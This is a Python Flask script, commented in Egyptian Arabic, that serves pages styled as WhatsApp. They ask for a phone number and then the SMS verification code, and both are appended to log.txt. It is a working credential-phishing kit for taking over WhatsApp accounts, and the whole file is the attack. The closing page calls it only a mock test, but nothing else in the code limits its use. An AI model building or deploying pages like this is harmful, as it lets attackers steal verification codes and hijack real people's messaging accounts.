from flask import Flask, request, redirect, url_for, render_template_string, session
import os

app = Flask(__name__)
app.secret_key = 'ليوان_الملك'  # مفتاح الجلسة علشان نحتفظ بالرقم بين الصفحتين

# الصفحة الأولى: إدخال رقم التليفون
phone_page = """
<!DOCTYPE html>
<html>
<head>
    <title>WhatsApp - Phone Number</title>
    <style>
        body { background-color: #e5ddd5; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background-color: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; width: 350px; }
        input, button { width: 90%; padding: 12px; margin: 10px 0; border-radius: 6px; font-size: 16px; border: 1px solid #ccc; }
        button { background-color: #25D366; color: white; border: none; cursor: pointer; }
        button:hover { background-color: #1DA851; }
    </style>
</head>
<body>
    <div class="container">
        <h2>أدخل رقم تليفونك</h2>
        <form method="POST">
            <input type="text" name="phone" placeholder="رقم التليفون" required>
            <button type="submit">التالي</button>
        </form>
    </div>
</body>
</html>
"""

# الصفحة الثانية: إدخال كود التحقق
code_page = """
<!DOCTYPE html>
<html>
<head>
    <title>WhatsApp - Verification</title>
    <style>
        body { background-color: #e5ddd5; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background-color: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; width: 350px; }
        input, button { width: 90%; padding: 12px; margin: 10px 0; border-radius: 6px; font-size: 16px; border: 1px solid #ccc; }
        button { background-color: #25D366; color: white; border: none; cursor: pointer; }
        button:hover { background-color: #1DA851; }
    </style>
</head>
<body>
    <div class="container">
        <h2>تم إرسال الكود على رقمك</h2>
        <form method="POST">
            <input type="text" name="code" placeholder="اكتب كود التحقق" required>
            <button type="submit">تأكيد</button>
        </form>
    </div>
</body>
</html>
"""

# صفحة النهاية بعد الحفظ
done_page = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>تم التسجيل</title>
</head>
<body style="font-family:Arial;text-align:center;margin-top:100px;">
    <h2>✅ تم تأكيد الرقم بنجاح</h2>
    <p>دي كانت تجربة وهمية بس، كل حاجة اتسجلت في log.txt</p>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def phone():
    if request.method == "POST":
        session["phone"] = request.form.get("phone")
        return redirect(url_for("verify"))
    return render_template_string(phone_page)

@app.route("/verify", methods=["GET", "POST"])
def verify():
    if request.method == "POST":
        code = request.form.get("code")
        phone = session.get("phone", "غير معروف")
        with open("log.txt", "a") as f:
            f.write(f"Phone: {phone} | Code: {code}\n")
        return render_template_string(done_page)
    return render_template_string(code_page)

if __name__ == "__main__":
    app.run(debug=True)
